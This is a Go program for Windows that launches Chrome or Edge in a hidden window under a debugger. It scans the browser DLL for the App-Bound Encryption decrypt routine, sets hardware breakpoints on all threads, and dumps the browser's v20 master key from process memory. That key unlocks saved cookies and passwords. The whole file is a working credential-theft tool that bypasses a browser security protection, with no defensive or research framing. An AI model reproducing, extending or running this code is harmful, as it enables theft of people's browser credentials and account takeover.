//go:build windows

// TODO
// multi profiles (probably impossible)
// spawn immediately under debugger
// if can't get even lea then terminate
// readme for edge

package main

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"unsafe"

	"deub/types"

	"golang.org/x/sys/windows"
)

const (
	LOAD_DLL_DEBUG_EVENT      uint32 = 6
	CREATE_THREAD_DEBUG_EVENT uint32 = 2
	EXCEPTION_DEBUG_EVENT     uint32 = 1
	DBG_CONTINUE              uint32 = 0x00010002
)

var (
	programFiles    = os.Getenv("ProgramFiles")
	programFilesX86 = os.Getenv("ProgramFiles(x86)")

	chromeExe = filepath.Join(programFiles, "Google", "Chrome", "Application", "chrome.exe")
	msedgeExe = filepath.Join(programFilesX86, "Microsoft", "Edge", "Application", "msedge.exe")

	browsers = [2]string{chromeExe, msedgeExe}
)

type SectionInfo struct {
	Name           string
	VirtualAddress uint32
	VirtualSize    uint32
	AbsoluteAddr   uintptr
}

func main() {
	for _, exeFile := range browsers {
		appName, err := windows.UTF16PtrFromString(exeFile)
		if err != nil {
			fmt.Println("UTF16PtrFromString:", err)
			return
		}

		if _, err := os.Stat(exeFile); err != nil {
			continue
		}

		var si windows.StartupInfo
		si.Cb = uint32(unsafe.Sizeof(si))
		si.Flags = windows.STARTF_USESHOWWINDOW
		si.ShowWindow = windows.SW_HIDE

		var pi windows.ProcessInformation

		err = windows.CreateProcess(
			appName,
			nil,
			nil,
			nil,
			false,
			windows.DEBUG_ONLY_THIS_PROCESS,
			nil,
			nil,
			&si,
			&pi,
		)

		if err != nil {
			fmt.Println(err)
			return
		}

		defer windows.CloseHandle(pi.Process)
		defer windows.CloseHandle(pi.Thread)

		fmt.Printf("created: pid=%d tid=%d\n", pi.ProcessId, pi.ThreadId)

		if strings.Compare(exeFile, msedgeExe) == 0 {
			err = startDebug(&pi, true)
		} else {
			err = startDebug(&pi, false)
		}
		if err != nil {
			fmt.Println(err)
		}
	}
}

func startDebug(pi *windows.ProcessInformation, isEdge bool) error {
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	var (
		baseDllAddr uintptr
		leaAddr     uintptr
	)

	fBp := true
	var debugEvent types.DEBUG_EVENT
	for {
		ok, err := WaitForDebugEvent(&debugEvent, 9000)
		if err != nil {
			return err
		}
		if !ok {
			return nil
		}

		continueStatus := DBG_CONTINUE

		switch debugEvent.DwDebugEventCode {
		case CREATE_THREAD_DEBUG_EVENT: // will start handle new threads if appears
			info := (*types.CREATE_THREAD_DEBUG_INFO)(unsafe.Pointer(&debugEvent.U[0]))

			if leaAddr != 0 && info.HThread != 0 {
				if _, err := setHwbpOnThread(info.HThread, uint64(leaAddr), false); err != nil {
					fmt.Printf("setHwbp CREATE_THREAD_DEBUG_EVENT: %v\n", err)
				}
			}
		case LOAD_DLL_DEBUG_EVENT:
			info := (*types.LOAD_DLL_DEBUG_INFO)(unsafe.Pointer(&debugEvent.U[0]))

			if info.HFile != 0 {
				name, err := getFinalPathNameByHandle(info.HFile)
				defer windows.CloseHandle(windows.Handle(info.HFile)) // essential to close handle

				if err == nil && strings.HasSuffix(strings.ToLower(name), "chrome.dll") || (isEdge && strings.HasSuffix(strings.ToLower(name), "msedge.dll")) {
					baseDllAddr = info.LpBaseOfDll

					rdata, err := findSection(pi.Process, baseDllAddr, ".rdata")
					if err != nil {
						fmt.Printf(".rdata: %v\n", err)
						break
					}
					fmt.Printf(".rdata va=0x%X rva=0x%X size=0x%X\n", rdata.AbsoluteAddr, rdata.VirtualAddress, rdata.VirtualSize)

					strAddr, idx, err := findABEString(rdata.VirtualSize, rdata.AbsoluteAddr, *pi)
					if err != nil {
						fmt.Printf("findABEString %v\n", err)
						break
					}
					fmt.Printf("string at 0x%X, offset 0x%X\n", strAddr, idx)

					leaAddr, err = findABELeaXref(*pi, baseDllAddr, strAddr)
					if err != nil {
						fmt.Printf("findABELeaXref: %v\n", err)
						break
					}
					fmt.Printf("LEA at 0x%X\n", leaAddr)

					if err := setHwbpOnAllThreads(pi.Process, uint64(leaAddr), false); err != nil {
						fmt.Printf("failed to set hwbp on leaAddr: %v", err)
						break
					}
				}
			}
		case EXCEPTION_DEBUG_EVENT:
			info := (*types.EXCEPTION_DEBUG_INFO)(unsafe.Pointer(&debugEvent.U[0]))

			switch info.ExeptionRecord.ExceptionCode {
			case uint32(windows.STATUS_BREAKPOINT): // EXCEPTION_BREAKPOINT
				if fBp {
					fBp = false
				} else {
					continueStatus = 0x80010001
				}
			case uint32(windows.STATUS_SINGLE_STEP):
				if info.ExeptionRecord.ExceptionAddress != leaAddr {
					break
				}

				hBpThread, err := windows.OpenThread(
					windows.THREAD_GET_CONTEXT|windows.THREAD_SET_CONTEXT|windows.THREAD_SUSPEND_RESUME|windows.THREAD_QUERY_INFORMATION,
					false,
					debugEvent.DwThreadId,
				)
				if err != nil {
					fmt.Printf("failed to STATUS_SINGLE_STEP: %v", err)
					break
				}

				key, err := dumpAbeKeyFromCtx(pi.Process, hBpThread, isEdge)
				windows.CloseHandle(hBpThread)
				if err != nil {
					fmt.Printf("failed to get v20key: %v", err)
					break
				}
				fmt.Println(key)

				_ = setHwbpOnAllThreads(pi.Process, uint64(leaAddr), true)

				if err := windows.TerminateProcess(pi.Process, 0); err != nil {
					fmt.Printf("fail to terminate: %v\n", err)
				}
				fmt.Printf("terminated successfully pid: %v\n", pi.ProcessId)
				return nil
			default:
				continueStatus = 0x80010001
			}
		}
		if _, err := ContinueDebugEvent(debugEvent.DwProcessId, debugEvent.DwThreadId, continueStatus); err != nil {
			return fmt.Errorf("ContinueDebugEvent failed: %w, %w", err, windows.GetLastError())
		}
	}
}

func dumpAbeKeyFromCtx(hProcess, hThread windows.Handle, isEdge bool) ([]byte, error) {
	var context types.AMD64CONTEXT
	context.ContextFlags = 0x1000007
	ret, err := GetThreadContext(hThread, &context)
	if err != nil && !ret {
		return nil, err
	}

	var keyPtrReg uint64 = context.R15
	if isEdge {
		keyPtrReg = context.R15 + 0x20 // for get ptr to key in edge it located at offset 32
	}

	buf := make([]byte, 16) // r15 byte address
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(
		hProcess,
		uintptr(keyPtrReg),
		&buf[0],
		8,
		&bytesRead,
	); err != nil {
		return nil, fmt.Errorf("ReadProcessMemory r15: %w", err)
	}
	buf = buf[:bytesRead]
	fmt.Printf("%x\n", buf)

	v20Key := make([]byte, 0x20)
	if err := windows.ReadProcessMemory(
		hProcess,
		uintptr(binary.LittleEndian.Uint64(buf)),
		&v20Key[0],
		0x20,
		&bytesRead,
	); err != nil {
		return nil, fmt.Errorf("ReadProcessMemory key: %w", err)
	}
	v20Key = v20Key[:bytesRead]

	return v20Key, nil
}

// we dont know in which thread master key will apear, so we have to scan all threads
func setHwbpOnAllThreads(hProcess windows.Handle, bpAddr uint64, clear bool) error {
	var hPrevThread windows.Handle = 0 // nullptr

	for {
		newThread, err := NtGetNextThread(hProcess, hPrevThread)
		if err != nil {
			return fmt.Errorf("enumerate threads: %w", err)
		}

		if newThread <= 0 { // end of threads
			break
		}

		if hPrevThread != 0 {
			windows.CloseHandle(hPrevThread)
		}
		hPrevThread = newThread

		_, err = setHwbpOnThread(newThread, bpAddr, clear)
		if err != nil {
			fmt.Println(err.Error())
			fmt.Printf("setHwbp on thread %v: %v\n", hPrevThread, err)
		}
	}

	if hPrevThread != 0 {
		windows.CloseHandle(hPrevThread)
	}

	return nil
}

func setHwbpOnThread(hThread windows.Handle, bpAddr uint64, clear bool) (bool, error) {
	var res bool
	var context types.AMD64CONTEXT
	context.ContextFlags = 0x1000010

	_, err := SuspendThread(hThread)
	if err != nil {
		return false, err
	}

	defer ResumeThread(hThread)

	ret, err := GetThreadContext(hThread, &context)

	if ret && err == nil {
		context.Dr6 = 0
		if clear {
			context.Dr0 = 0
			context.Dr7 = 0
		} else {
			context.Dr0 = bpAddr
			context.Dr7 = 1
		}

		res, err = SetThreadContext(hThread, &context)
		if err != nil {
			return res, err
		}
	} else {
		res = false
	}
	return res, nil
}

func findABEString(virtualSize uint32, rdataVA uintptr, pi windows.ProcessInformation) (uintptr, int, error) {
	buffer := make([]byte, virtualSize)
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(
		pi.Process,
		rdataVA,
		&buffer[0],
		uintptr(len(buffer)),
		&bytesRead,
	); err != nil { // hohoho hehehe hahaha hwhwhw
		return 0, 0, fmt.Errorf("ReadProcessMemory .rdata: %w", err)
	}

	buffer = buffer[:bytesRead]

	tStr := []byte("OSCrypt.AppBoundProvider.Decrypt.ResultCode")
	idx := bytes.Index(buffer, tStr)
	if idx < 0 {
		return 0, 0, fmt.Errorf("string not found in .rdata")
	}

	strAddr := rdataVA + uintptr(idx)

	return strAddr, idx, nil
}

func findABELeaXref(pi windows.ProcessInformation, dllBase, strAddr uintptr) (uintptr, error) {
	text, err := findSection(pi.Process, dllBase, ".text")
	if err != nil {
		return 0, err
	}

	var bytesRead uintptr
	textBuf := make([]byte, text.VirtualSize)
	if err := windows.ReadProcessMemory(
		pi.Process,
		text.AbsoluteAddr,
		&textBuf[0],
		uintptr(len(textBuf)),
		&bytesRead,
	); err != nil {
		return 0, err
	}

	textBuf = textBuf[:bytesRead]

	for i := 0; i+7 <= len(textBuf); i++ {
		if textBuf[i] != 0x48 || textBuf[i+1] != 0x8D || textBuf[i+2] != 0x0D { // check for LEA instruction
			continue
		}

		disp := binary.LittleEndian.Uint32(textBuf[i+3 : i+7])
		nextRIP := text.AbsoluteAddr + uintptr(i) + 7
		target := uintptr(int64(nextRIP) + int64(disp))

		if target == strAddr {
			return text.AbsoluteAddr + uintptr(i), nil
		}
	}

	return 0, errors.New("LEA to strAddr not found in .text")
}

func findSection(hProcess windows.Handle, baseDllAddr uintptr, sectionName string) (*SectionInfo, error) {
	var dosBuf [64]byte
	var bytesRead uintptr
	if err := windows.ReadProcessMemory(
		hProcess,
		baseDllAddr,
		&dosBuf[0],
		uintptr(len(dosBuf)),
		&bytesRead,
	); err != nil {
		return nil, fmt.Errorf("ReadProcessMemory (DOS header): %w", err)
	}
	e_lfanew := binary.LittleEndian.Uint32(dosBuf[0x3C:0x40])

	ntHeaderAddr := baseDllAddr + uintptr(e_lfanew)
	var ntBuf [24]byte
	if err := windows.ReadProcessMemory(
		hProcess,
		ntHeaderAddr,
		&ntBuf[0],
		uintptr(len(ntBuf)),
		&bytesRead,
	); err != nil {
		return nil, fmt.Errorf("ReadProcessMemory (NT headers): %w", err)
	}
	nOfSections := binary.LittleEndian.Uint16(ntBuf[6:8])
	sizeOfOptionalHeader := binary.LittleEndian.Uint16(ntBuf[20:22])

	secTable := ntHeaderAddr + 4 + 20 + uintptr(sizeOfOptionalHeader)

	const sectionHeaderSize = 40
	for i := range nOfSections {
		sectionAddr := secTable + uintptr(i)*sectionHeaderSize

		var secBuf [sectionHeaderSize]byte
		if err := windows.ReadProcessMemory(
			hProcess,
			sectionAddr,
			&secBuf[0],
			uintptr(len(secBuf)),
			&bytesRead,
		); err != nil {
			return nil, fmt.Errorf("ReadProcessMemory (section %d): %w", i, err)
		}

		name := strings.TrimRight(string(secBuf[:8]), "\x00")
		if name != sectionName {
			continue
		}

		virtualSize := binary.LittleEndian.Uint32(secBuf[8:12])
		virtualAddress := binary.LittleEndian.Uint32(secBuf[12:16])

		return &SectionInfo{
			Name:           name,
			VirtualAddress: virtualAddress,
			VirtualSize:    virtualSize,
			AbsoluteAddr:   baseDllAddr + uintptr(virtualAddress),
		}, nil
	}

	return nil, fmt.Errorf("section %q not found in module at 0x%X", sectionName, baseDllAddr)
}

func getFinalPathNameByHandle(hFile uintptr) (string, error) {
	buf := make([]uint16, windows.MAX_PATH)
	n, err := windows.GetFinalPathNameByHandle(
		windows.Handle(hFile),
		&buf[0],
		uint32(len(buf)),
		0x0, // normalize drive name FILE_NAME_NORMILIZED
	)
	if err != nil {
		return "", err
	}

	name := windows.UTF16ToString(buf[:n])

	return name, nil
}
